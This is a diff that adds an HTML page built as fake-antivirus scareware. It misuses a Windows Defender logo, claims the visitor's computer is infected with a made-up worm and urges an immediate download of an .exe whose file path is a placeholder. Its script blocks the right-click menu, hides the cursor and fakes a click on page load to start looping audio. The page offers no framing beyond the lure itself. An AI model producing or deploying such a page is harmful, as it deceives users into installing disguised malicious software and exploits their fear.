@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Dangerous malware detected on your computer!</title>
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            background-color: #0177d7; /* Set the background color here */
+            overflow: hidden; /* Prevent scrolling */
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: none; /* Hides the cursor */
+        }
+
+        .popup-container {
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #fff;
+            padding: 40px;
+            border-radius: 17px;
+            text-align: center;
+            animation: pulse 2s infinite;
+            cursor: auto; /* Show the cursor within the popup */
+        }
+
+        .icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .icon img {
+            width: 40px;
+            height: 40px;
+            margin-right: 10px;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.2);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="popup-container">
+        <div class="icon">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Windows_Defender_logo.svg/1950px-Windows_Defender_logo.svg.png" alt="MALWARE DETECTED">
+            <h1>Dangerous virus detected!</h1>
+        </div>
+        <p>Your computer has been infected with Worm:Win64/Java!bin</p>
+        <p>Immediately download the software to resolve issues:</p>
+        <a id="downloadLink" href="path_to_your_software_file.exe" download>
+            <img src="https://phasedj.zendesk.com/hc/article_attachments/6268113235741/CTA_PhaseManager_win.png" alt="Download Software" style="width: 150px;">
+        </a>
+    </div>
+
+    <div id="emptyArea" style="position: absolute; left: -100px; top: -100px; width: 1px; height: 1px;"></div>
+
+    <script>
+        document.addEventListener('contextmenu', function(event) {
+            event.preventDefault();
+        });
+
+        var audio = new Audio('bleed.mp3'); // Replace with the correct path to your audio file
+        audio.loop = true;
+
+        // Function to play audio when any element is clicked
+        function playAudioOnClick() {
+            audio.play();
+        }
+
+        // Attach click event listener to the document body
+        document.body.addEventListener('click', playAudioOnClick);
+
+        // Simulate click on an empty area when the page loads
+        window.onload = function() {
+            var emptyArea = document.getElementById('emptyArea');
+            emptyArea.click();
+        };
+    </script>
+</body>
+</html>
